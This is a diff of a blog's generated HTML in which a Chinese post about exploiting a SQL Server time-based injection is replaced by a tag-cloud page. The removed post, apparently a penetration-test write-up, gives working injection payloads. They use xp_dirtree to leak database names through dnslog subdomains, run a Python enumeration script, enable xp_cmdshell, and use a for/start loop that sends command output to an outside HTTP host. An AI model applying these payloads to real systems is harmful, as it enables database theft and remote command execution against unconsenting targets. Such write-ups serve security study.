@@ -15,19 +15,16 @@
 
 
 
-<meta name="description" content="dnslog是指dns日志信息，通过这个方式可以将原本没法回显的信息获取到，本篇文章记录的是在sql延时注入时dnslog的利用实践。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="「记录」一次sql延时注入之dnslog的利用">
-<meta property="og:url" content="http://Levi.cx/2017/01/18/dnslog-sqli/index.html">
+<meta name="description" content="description">
+<meta property="og:type" content="website">
+<meta property="og:title" content="tags">
+<meta property="og:url" content="http://Levi.cx/tags/index.html">
 <meta property="og:site_name" content="lEvi's blog">
-<meta property="og:description" content="dnslog是指dns日志信息，通过这个方式可以将原本没法回显的信息获取到，本篇文章记录的是在sql延时注入时dnslog的利用实践。">
-<meta property="og:image" content="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png">
-<meta property="og:image" content="http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b.png">
-<meta property="og:updated_time" content="2017-05-10T18:06:46.000Z">
+<meta property="og:description" content="description">
+<meta property="og:updated_time" content="2017-05-10T18:10:52.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="「记录」一次sql延时注入之dnslog的利用">
-<meta name="twitter:description" content="dnslog是指dns日志信息，通过这个方式可以将原本没法回显的信息获取到，本篇文章记录的是在sql延时注入时dnslog的利用实践。">
-<meta name="twitter:image" content="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png">
+<meta name="twitter:title" content="tags">
+<meta name="twitter:description" content="description">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>「记录」一次sql延时注入之dnslog的利用 | lEvi&#39;s blog</title>
+<title>tags | lEvi&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -69,7 +66,7 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: true,
+        isPost: false,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -270,11 +267,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-dnslog-sqli" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/01/18/dnslog-sqli/" class="article-date">
-      <time datetime="2017-01-18T14:59:39.000Z" itemprop="datePublished">2017-01-18</time>
+      <a href="/tags/index.html" class="article-date">
+      <time datetime="2017-05-10T18:10:52.000Z" itemprop="datePublished">2017-05-11</time>
 </a>
 
 
@@ -289,7 +286,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      「记录」一次sql延时注入之dnslog的利用
+      tags
     </h1>
   
 
@@ -299,10 +296,6 @@
         
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sec/">sec</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -310,120 +303,96 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>dnslog是指dns日志信息，通过这个方式可以将原本没法回显的信息获取到，本篇文章记录的是在sql延时注入时dnslog的利用实践。<br><a id="more"></a></p>
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>上周我们团队对某网站进行安全测试的时候发现这样一个注入点：</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;WAITFOR" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;WAITFOR</a> DELAY ‘0:0:5’– </p>
-</blockquote>
-<p>这个字符注入点经过测试，只支持bool型注入和延时注入(可多行sql语句执行)。</p>
-<p>这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。</p>
-<p>说到这里我不得不吐槽一下，cloudeye作为一个dnslog平台已经关门大吉了却不把web服务器关掉，让我误以为是我操作不当导致收不到日志，后来用的另外一个dnslog平台。。</p>
-<p>回到正题，经过推测这个注入点是sql server数据库的，sql server如果要进行dns解析的话用master..xp_dirtree这个存储过程，最终构造出如下语句：</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE</a> @host varchar(1024);S</p>
-</blockquote>
-<p>解释一下整个语句的意思<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</div></pre></td></tr></table></figure></p>
-<p>这条语句的意思是注册一个名为@host的变量，类型为varchar<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),db_name())+<span class="string">'.xxxxxxxxx.dnslog.link'</span>;</div></pre></td></tr></table></figure></p>
-<p>这条语句的意思是获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</p>
-<p>打个比方，如果db_name()返回值是abc 那么拼接后就是@host=abc.xxxxxxxxx.dnslog.link<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');</div></pre></td></tr></table></figure></p>
-<p>这条语句的意思就是咧远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了。</p>
-<p>如此以来便得到了db_name()的值。</p>
-<p>但是这里有个坑，不能获取@@version，我想了一下 可能是因为@@version中有空格换行等字符，导致拼接出来的子域名不符合规范，所以无法完成解析。后来我准备吧@@version hex一下再拼接进域名里面。。。但是我发现。。sql server居然没有hex()函数？？？</p>
-<p>后来我一通百度之后也没找到sql server把字符串转为16进制的函数。。这就很尴尬了，有找到的麻烦告诉我下。</p>
-<p>接下来，我写了个脚本，吧所有的裤名跑了出来。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    url = <span class="string">'''http://xxxx.xxxx.com.cn/Login.ashx?Id=123%27;DECLARE%20@host%20varchar(1024);SELECT%20@host=CONVERT(varchar(1048),(select%20name%20from%20master.dbo.sysdatabases%20where%20dbid=1%20))%2b%27.xxxxxxxx.dnslog.link%27;EXEC(%27master..xp_dirtree%20%22\\\\%27%2b@host%2b%27\\foobar$%22%27);--'''</span></div><div class="line">    url = url.replace(<span class="string">"dbid=1"</span>,<span class="string">"dbid="</span>+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    <span class="keyword">print</span> req.get_full_url()</div><div class="line">    <span class="keyword">print</span> urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>
-<p>dns日志如下<br><img src="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png" alt="pic1"><br>到这步其实已经可以dump数据库了，但是我发现还可以继续渗透。</p>
-<p>经过测试，我发现是sa权限，于是我开启了xp_cmdshell组件进行命令执行</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell ‘ping cmdtest.xxxxxxxx.dnslog.link’–</p>
-</blockquote>
-<p>ping一下，看看dns日志里会不会出现cmdtest.xxxxxxxx.dnslog.link域名的日志，经过查看确实已经收到，由于日志清空了一次 当时没截图，就不复现再截图了。</p>
-<p>然后有个问题，就是命令回显的问题。</p>
-<p>传统的做法的创建一个两个字段的表，然后吧每次执行cmd 的结果都插入到表里，要查看的时候再取出来。</p>
-<p>于是我</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;create" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;create</a> table tmptmp(tmp1 varchar(1024),tmp2 varchar(1024));</p>
-</blockquote>
-<p>但是我发现表却创建不成功，不知道是何原因。这里有另外一个过于麻烦的思路，那就是把所有的表结构都跑出来，然后找一个能插入cmd结果的表，将返回结果插入到那张表里。</p>
-<p>但是凡事都要找最优解。。于是我想了另一个办法：</p>
-<p>将一个命令的执行结果作为另一个命令的参数，就比如，先执行whoami拿到结果，然后ping whoami的结果.xxxxxxxx.dnslog.link 这样就可以把结果放到子域名里通过dns日志拿到了。。</p>
-<p>可是我找了半天没找到相关的语法，后来基友这么一条语句搞定了：</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “for /F %s in (‘dir’) do start <a href="http://123.123.123.123/?%s&quot;--" target="_blank" rel="external">http://123.123.123.123/?%s&quot;--</a> </p>
-</blockquote>
-<p>搭建http服务器看web日志，利用for设置变量存储命令执行结果 start进行http访问并带上结果</p>
-<p>成功收到结果，这儿我想 用ping命令进行拼接然后读取dns日志应该也是没问题的，不过应该没走http好使<br><img src="http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b.png" alt="pic2"></p>
-<p>由于start会启动浏览器，所以要关闭一下浏览器</p>
-<blockquote>
-<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “taskkill /f /im iexplore.exe”–</p>
-</blockquote>
-<p>以上</p>
+              <style>
+    .article-meta { display: none; }
+    #container .article .article-title { padding-right: 0; }
+    .article-header {
+        padding: 0;
+        padding-top: 26px;
+        border-left: none;
+        text-align: center;
+    }
+    .article-header:hover { border-left: none; }
+    .article-title { font-size: 1.6em }
+    .article-entry hr { margin: 0;}
+    .article-meta,
+    #container .article-info-post.article-info { display: none;}
+    #container .article .article-title { padding: 0; }
+</style>
 
+
+    <!-- Tag Cloud Page -->
+    <hr>
+<br>
+
+
+<p class="count"></p>
+
+<div class="tags">
+    <a href="/tags/other/" style="font-size: 16px; color: #808080">other</a> <a href="/tags/sec/" style="font-size: 35px; color: #000">sec</a>
+</div>
+<style>
+    .category-list li{
+        display: inline-block;
+        margin: 0 1em .5em 0;
+        padding: 4px;
+        border: 1px solid lightgray;
+        font-size: 1.2rem;
+    }
+    .category-list a { color: gray; }
+    .category-list-item:hover a {
+        color: gray;
+        text-decoration: none;
+    }
+    .category-list-count {
+        margin-left: 2px;
+        font-size: .9rem;
+    }
+    .article-entry ul li:before{ display: none; }
+    .article-inner { text-align: center; }
+    .tags {
+        max-width: 42em;
+        margin: 2em auto;
+        margin-top: 0em;
+    }
+    .tags a {
+        margin-right: 1em;
+        line-height: 65px;
+        border-bottom: 1px solid gray;
+        white-space: nowrap;
+        transition: border-bottom .5s;
+    }
+    .tags a:hover {
+        border-bottom: 3px dotted gray;
+        text-decoration: none;
+    }
+    #count > span {
+        margin: auto .2em;
+        font-weight: bold;
+    }
+</style>
+
+<!-- Count tags and categories -->
+<p id="count">
+        已有<span><script>document.write($(".category-list-item").length)</script></span>个分类，
+        共计<span><script>document.write($(".tags > a").length)</script></span>个标签
+</p>
+<script>
+    $('#count').appendTo('.count');
+</script>
+
+          
+        
       
     </div>
     
   </div>
   
     
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/01/18/dnslog-sqli/">「记录」一次sql延时注入之dnslog的利用</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">lEvi</a></p>
-        <p><span>发布时间:</span>2017-01-18, 22:59:39</p>
-        <p><span>最后更新:</span>2017-05-11, 02:06:46</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/01/18/dnslog-sqli/" title="「记录」一次sql延时注入之dnslog的利用">http://Levi.cx/2017/01/18/dnslog-sqli/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://Levi.cx/2017/01/18/dnslog-sqli/　　作者: lEvi" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
 
-
-
-    <nav id="article-nav">
-        
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/01/22/myeclipse-decompile-java-code-plugin/">
-                    MyEclipse自动反编译java代码插件
-                </a>
-            </div>
-        
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/01/12/hello-world/">
-                    Hello World
-                </a>
-            </div>
-        
-    </nav>
 
   
 </article>
-
-    <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
-        
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li></ol>
-        
-    </div>
-    <style>
-        .left-col .switch-btn,
-        .left-col .switch-area {
-            display: none;
-        }
-        .toc-level-3 i,
-        .toc-level-3 ol {
-            display: none !important;
-        }
-    </style>
-
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-    <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
-    </script>
 
 
 
@@ -441,7 +410,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"「记录」一次sql延时注入之dnslog的利用　| lEvi's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"tags　| lEvi's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -470,26 +439,6 @@
 </section>
     
 
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2017/01/22/myeclipse-decompile-java-code-plugin/" title="上一篇: MyEclipse自动反编译java代码插件">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-
-        
-            <a href="/2017/01/12/hello-world/" title="下一篇: Hello World">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/01/22/myeclipse-decompile-java-code-plugin/">MyEclipse自动反编译java代码插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/dnslog-sqli/">「记录」一次sql延时注入之dnslog的利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/12/hello-world/">Hello World</a></li></ul>
 
 
 
